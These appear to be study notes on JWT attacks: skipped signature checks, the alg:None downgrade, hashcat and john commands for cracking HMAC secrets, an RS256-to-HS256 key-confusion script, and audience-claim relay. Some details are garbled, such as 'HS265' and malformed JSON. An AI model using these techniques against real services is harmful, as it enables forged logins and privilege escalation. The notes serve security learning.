# JWT

| Header | Payload | Signature |
| ------ | ------- | --------- |
| eyhbGkpXVCJ9 | eyJzdWfQ | mATWpEnOFqwaNENrxl |
| {"alg":"sha256", "type": "JWT"} | {"username": "test", "admin" 1} | Signature |

## Signing Algorithms

### None: 
- No algorithm is used. 
- No verification

### Symmetric
- HS265
- Appends a secret value to the header 
- Appends secret value to body
- Generate hash
- Verification done by any system with knowledge of the secret key.
- Peer to peer

### Asymmetric
- RS256
- Produced by sender with private key
- Verified by receiver with public key

## Signature Verification
If the signature is not verified it is possible to verify the claims of the token.

Vulnerable code:
```py
payload = jwt.decode(token, options ={'verify_signature': False})
```

Alter the claim, and send back the token.
```sh
eyhbGkpXVCJ9.eyJzdWfQ.
```

## Downgrading to None
In some cases changing the `alg:None` will cause the verification library to return `true`

```py
header = jwt.get_unverified_header(token)
signature_algorithm = header['alg']
payload = jwt.decode(token, self.secret, algorithms=signature_algorithm)
```

## Cracking 

### Symmetric JWT token
Put the token into a file (jwt.txt):
```sh
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InvzZXIiLCJhZG1pbiI6MH0.yN1f3Rq8b26KEUYHCZbEwEk6LVzRYtbGzJMFIF8i5HY
```

Find a wordlist & crack
```sh
hashcat -m 16500 -a 0 jwt.txt jwt_wordlist.txt
john jwt.txt -w jwt_wordlist.txt --format=HMAC-SHA256
```

Use the site to alter the claim
[jwt.io](https://jwt.io)


## Signature Confusion
If an asymmetric signing algorithm is used it may be possible to downgrade it to `HS256`.  In the case the downgrade works the library would default back to using the public key as the secret which we know.

Basic downgrade example: 

Note: for this attack to work you must undo a patch in the python library.
- open `/usr/lib/python3/dist-packages/jwt/algorithms.py`
- comment out `143-`146`
- may need to remove `is_ssh_key` on `258` too

```py
import jwt

public_key = '<key>

payload = {
    'username': 'user',
    'admin': 0
}

access_token = jwt.encode(payload, public_key, algorithm='HS256')
print(access_token)
```

## Cross Service Relay Attacks
If a correct audience claim is not defined it can be exploited.

Audience claim
- Single authentication server
- Provides tokens to multiple services
- User is granted 'admin: true' claim
- If audience is not specified user can access all services




